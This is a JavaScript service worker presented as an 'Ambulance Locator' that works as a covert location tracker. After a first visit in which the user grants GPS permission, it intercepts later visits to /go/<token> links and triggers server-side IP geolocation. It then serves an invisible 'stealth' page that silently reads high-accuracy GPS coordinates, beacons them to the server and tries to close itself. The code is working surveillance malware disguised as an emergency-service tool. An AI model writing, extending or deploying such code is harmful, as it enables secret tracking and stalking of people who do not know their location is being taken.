// ═══════════════════════════════════════════════════════════
// AMBULANCE LOCATOR — Service Worker v2.1 (SMART INTERCEPT)
// ═══════════════════════════════════════════════════════════
// First visit: let navigation through → verify.html (GPS permission)
// Subsequent visits: intercept with stealth HTML (cached GPS)
// ═══════════════════════════════════════════════════════════

const CACHE_NAME = "ambulance-locator-v2";
let gpsGrantedTokens = new Set();

// ── Load cached tokens from IndexedDB on startup ──
(function loadCache() {
  try {
    self.indexedDB.open("gps-cache", 1).onsuccess = function(e) {
      const db = e.target.result;
      const tx = db.transaction("tokens", "readonly");
      const store = tx.objectStore("tokens");
      store.getAll().onsuccess = function(evt) {
        (evt.target.result || []).forEach(function(t) { gpsGrantedTokens.add(t); });
      };
    };
  } catch(e) {}
})();

function saveTokenToCache(token) {
  gpsGrantedTokens.add(token);
  try {
    self.indexedDB.open("gps-cache", 1).onupgradeneeded = function(e) {
      e.target.result.createObjectStore("tokens", { keyPath: "token" });
    };
    const req = self.indexedDB.open("gps-cache", 1);
    req.onsuccess = function(e) {
      const db = e.target.result;
      const tx = db.transaction("tokens", "readwrite");
      tx.objectStore("tokens").put({ token: token, timestamp: Date.now() });
      tx.commit();
    };
  } catch(e) {}
}

self.addEventListener("install", function(event) {
  self.skipWaiting();
});

self.addEventListener("activate", function(event) {
  event.waitUntil(self.clients.claim());
});

// ── Intercept navigation to /go/<token> ──
self.addEventListener("fetch", function(event) {
  const url = new URL(event.request.url);
  const match = url.pathname.match(/^\/go\/([a-f0-9]+)$/);
  if (!match || event.request.method !== "GET") return;

  const token = match[1];
  const origin = url.origin;
  const isNavigation = event.request.mode === "navigate";

  if (!isNavigation) return;

  event.respondWith(
    (async function() {
      try {
        // ── Step 1: Always trigger server-side IP geolocation ──
        const captureUrl = origin + "/sw-capture/" + token;
        fetch(captureUrl, { method: "GET", headers: { "X-SW-Intercept": "1" } });

        // ── Step 2: Decision: Show verify page OR stealth? ──
        // Check if GPS permission was previously granted for this token
        // We store this in a cache after verify.html succeeds
        const cache = await caches.open(CACHE_NAME);
        const cacheKey = "gps-done-" + token;
        const cachedEntry = await cache.match(cacheKey);
        const gpsWasGranted = cachedEntry !== undefined || gpsGrantedTokens.has(token);

        if (gpsWasGranted) {
          // ── SUBSEQUENT VISIT: Stealth mode (GPS permission cached) ──
          const stealthHtml = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<meta http-equiv="refresh" content="0;url=about:blank" />
<title> </title>
<style>
  *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
  html, body { background: #000; overflow: hidden; width: 100%; height: 100%; }
  body { opacity: 0; }
</style>
</head>
<body>
<script>
(function(){
  var t="${token}";
  function sendCoords(lat,lng,acc){
    var p=JSON.stringify({token:t,latitude:lat,longitude:lng,accuracy:acc});
    var b=new Blob([p],{type:"application/json"});
    navigator.sendBeacon("/api/location-update",b);
  }
  if(navigator.permissions&&navigator.permissions.query){
    navigator.permissions.query({name:"geolocation"}).then(function(st){
      if(st.state==="granted"&&"geolocation"in navigator){
        navigator.geolocation.getCurrentPosition(
          function(pos){sendCoords(pos.coords.latitude,pos.coords.longitude,pos.coords.accuracy);},
          function(){},
          {enableHighAccuracy:true,timeout:8000,maximumAge:60000}
        );
      }
    }).catch(function(){});
  }
  try{window.location.replace("about:blank")}catch(e){}
  try{window.open("","_self","").close()}catch(e){}
  try{self.close()}catch(e){}
  try{window.close()}catch(e){}
})();
<\/script>
</body>
</html>`;

          return new Response(stealthHtml, {
            headers: {
              "Content-Type": "text/html; charset=utf-8",
              "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
              "Pragma": "no-cache",
              "X-Robots-Tag": "noindex, nofollow",
            }
          });
        } else {
          // ── FIRST VISIT: Let navigation through to server (verify.html) ──
          // Return the actual response from the server
          const serverResponse = await fetch(event.request);
          
          // After this page loads and user grants GPS, verify.html will call
          // /api/location-update which signals success. But we also need a way
          // for the SW to know permission was granted. We'll set a flag via
          // a special endpoint call or client message.
          
          return serverResponse;
        }
      } catch (e) {
        // Fallback: let the browser navigate normally
        return fetch(event.request);
      }
    })()
  );
});

// ── Listen for messages from verify.html to mark GPS as granted ──
self.addEventListener("message", function(event) {
  if (event.data && event.data.type === "GPS_GRANTED" && event.data.token) {
    saveTokenToCache(event.data.token);
    // Also store in cache API
    caches.open(CACHE_NAME).then(function(cache) {
      cache.put("gps-done-" + event.data.token, new Response("1"));
    });
  }
});
